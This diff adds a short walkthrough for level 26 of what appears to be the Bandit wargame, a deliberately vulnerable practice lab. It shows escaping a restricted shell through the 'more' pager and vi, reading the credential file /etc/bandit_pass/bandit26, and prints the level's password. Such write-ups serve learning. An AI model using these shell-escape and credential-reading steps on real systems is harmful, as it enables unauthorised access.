@@ -1,0 +1,13 @@
+Connect to bandit 26 with the ssh key
+
+ssh -i bandit26.privatekey bandit26@localhost
+
+/!\ before typing yes, put your shell windows as little as possible to trigger more/!\
+press v to Enter visual mode
+
+:set shell=/bin/bash
+:shell
+
+cat /etc/bandit_pass/bandit26
+
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
